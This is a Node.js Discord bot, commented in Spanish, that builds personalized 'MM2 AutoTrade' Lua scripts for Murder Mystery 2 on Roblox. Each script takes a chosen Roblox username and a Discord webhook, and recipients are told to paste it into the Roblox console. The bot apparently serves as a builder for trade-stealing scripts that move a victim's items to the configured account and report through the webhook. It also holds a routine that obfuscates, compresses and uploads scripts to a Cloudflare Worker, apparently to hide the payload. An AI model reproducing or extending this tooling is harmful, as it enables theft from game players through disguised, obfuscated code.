require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  EmbedBuilder,
  Colors,
} = require('discord.js');
const axios = require('axios');
const zlib = require('zlib');
const JavaScriptObfuscator = require('javascript-obfuscator');
const fs = require('fs');

const client = new Client({
  intents: [GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages, GatewayIntentBits.Guilds],
});

// Configuración
const CLOUDFLARE_URL = process.env.CLOUDFLARE_WORKER_URL || 'https://tu-dominio.workers.dev';
let MM2_SCRIPT = '';

// Cargar script Lua al iniciar
try {
  MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
  console.log('✅ Script MM2 cargado correctamente');
} catch (error) {
  console.error('❌ Error al cargar mm2-script.lua:', error.message);
  process.exit(1);
}

// Eventos del bot
client.once('ready', () => {
  console.log(`✅ Bot conectado como ${client.user.tag}`);
  console.log(`📊 Sirviendo a ${client.guilds.cache.size} servidores`);

  // Registrar comandos slash
  const commands = [
    new SlashCommandBuilder()
      .setName('generate')
      .setDescription('Genera un script personalizado')
      .addSubcommand(sub =>
        sub
          .setName('script')
          .setDescription('Genera script de AutoTrade para MM2')
      ),
  ];

  client.application.commands.set(commands);
  console.log('✅ Comandos registrados');
});

client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isCommand()) {
      if (interaction.commandName === 'generate' && interaction.options.getSubcommand() === 'script') {
        // Mostrar select menu de juegos
        const selectMenu = new StringSelectMenuBuilder()
          .setCustomId('game_select')
          .setPlaceholder('Selecciona un juego')
          .addOptions(
            new StringSelectMenuOptionBuilder()
              .setLabel('Murder Mystery 2')
              .setValue('mm2')
              .setDescription('AutoTrade para MM2')
              .setEmoji('🔪')
          );

        const row = new ActionRowBuilder().addComponents(selectMenu);
        await interaction.reply({
          content: '🎮 Selecciona el juego para generar tu script personalizado:',
          components: [row],
          ephemeral: true,
        });
      }
    }

    if (interaction.isStringSelectMenu()) {
      if (interaction.customId === 'game_select') {
        const game = interaction.values[0];

        // Mostrar modal con validación
        const modal = new ModalBuilder()
          .setCustomId(`config_modal_${game}`)
          .setTitle('Configurar Script Personalizado');

        const usernameInput = new TextInputBuilder()
          .setCustomId('username')
          .setLabel('Tu Usuario de Roblox')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('ejemplo: claudee')
          .setRequired(true)
          .setMinLength(1)
          .setMaxLength(20);

        const webhookInput = new TextInputBuilder()
          .setCustomId('webhook')
          .setLabel('Discord Webhook URL')
          .setStyle(TextInputStyle.Paragraph)
          .setPlaceholder('https://discord.com/api/webhooks/...')
          .setRequired(true)
          .setMinLength(10);

        modal.addComponents(
          new ActionRowBuilder().addComponents(usernameInput),
          new ActionRowBuilder().addComponents(webhookInput)
        );

        await interaction.showModal(modal);
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId.startsWith('config_modal_')) {
        const game = interaction.customId.replace('config_modal_', '');
        const username = interaction.fields.getTextInputValue('username');
        const webhook = interaction.fields.getTextInputValue('webhook');

        await interaction.deferReply({ ephemeral: true });

        // Validar webhook
        if (!isValidWebhook(webhook)) {
          await interaction.editReply({
            content: '❌ El webhook URL no es válido. Debe ser una URL de webhook de Discord.',
          });
          return;
        }

        // Validar username
        if (!isValidUsername(username)) {
          await interaction.editReply({
            content: '❌ El nombre de usuario no es válido. Usa solo letras, números y guiones.',
          });
          return;
        }

        try {
          // Generar script personalizado
          const script = await generateScript(game, username, webhook);

          // Enviar DM al usuario
          try {
            const dmChannel = await interaction.user.createDM();

            // Dividir el script en partes si es muy largo
            const maxLength = 1950;
            const parts = [];
            for (let i = 0; i < script.length; i += maxLength) {
              parts.push(script.substring(i, i + maxLength));
            }

            const embed = new EmbedBuilder()
              .setColor(Colors.Green)
              .setTitle('🔪 Tu Script MM2 AutoTrade')
              .setDescription('Tu script está listo. Cópialo y ejecuta en tu consola de Roblox (F9)')
              .addFields(
                { name: '👤 Usuario Configurado', value: `\`${username}\``, inline: true },
                { name: '🎮 Juego', value: 'Murder Mystery 2', inline: true },
                {
                  name: '⚙️ Instrucciones',
                  value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. Copia y pega todo el script\n5. Presiona Enter',
                }
              )
              .setFooter({ text: 'AutoTrade MM2 | Script personalizado' })
              .setTimestamp();

            await dmChannel.send({ embeds: [embed] });

            // Enviar el script en partes
            for (let i = 0; i < parts.length; i++) {
              const partNum = parts.length > 1 ? ` (Parte ${i + 1}/${parts.length})` : '';
              await dmChannel.send(`\`\`\`lua\n${parts[i]}\n\`\`\`${partNum}`);
            }

            await interaction.editReply({
              content: '✅ Script generado exitosamente. Revisa tu DM privado.',
            });

            console.log(`📝 Script generado para ${interaction.user.tag} (${username})`);
          } catch (err) {
            console.error('DM Error:', err);
            await interaction.editReply({
              content: '❌ No se pudo enviar DM. ¿Tienes los DMs abiertos con bots?',
            });
          }
        } catch (error) {
          console.error('Script Generation Error:', error);
          await interaction.editReply({
            content: `❌ Error al generar script: ${error.message}`,
          });
        }
      }
    }
  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({
        content: '❌ Error procesando tu solicitud. Intenta de nuevo.',
        ephemeral: true,
      }).catch(console.error);
    }
  }
});

// Funciones
async function generateScript(game, username, webhook) {
  if (game === 'mm2') {
    return MM2_SCRIPT
      .replace(/TARGET_USER = "example"/g, `TARGET_USER = "${username}"`)
      .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
  }
  throw new Error('Juego no soportado');
}

async function uploadToCloudflare(scriptCode) {
  try {
    // 1. Ofuscar
    const obfuscated = JavaScriptObfuscator.obfuscate(scriptCode, {
      compact: true,
      controlFlowFlattening: false,
      unicodeEscapeSequence: false,
    }).getObfuscatedCode();

    // 2. Comprimir
    const compressed = zlib.deflateSync(obfuscated);
    const encoded = compressed.toString('base64');

    // 3. Enviar a Cloudflare Worker
    const response = await axios.post(`${CLOUDFLARE_URL}/store`, { script: encoded }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 10000,
    });

    if (!response.data.id) {
      throw new Error('No se recibió ID del servidor');
    }

    return response.data.id;
  } catch (error) {
    console.error('Cloudflare Upload Error:', error.message);
    throw new Error('Error al subir el script a Cloudflare');
  }
}

function isValidWebhook(webhook) {
  try {
    const url = new URL(webhook);
    return url.hostname === 'discord.com' && webhook.includes('/webhooks/');
  } catch {
    return false;
  }
}

function isValidUsername(username) {
  return /^[a-zA-Z0-9_-]{1,20}$/.test(username);
}

// Error handlers
client.on('error', error => {
  console.error('🔴 Client Error:', error);
});

process.on('unhandledRejection', error => {
  console.error('🔴 Unhandled Rejection:', error);
});

// Login
client.login(process.env.DISCORD_TOKEN);
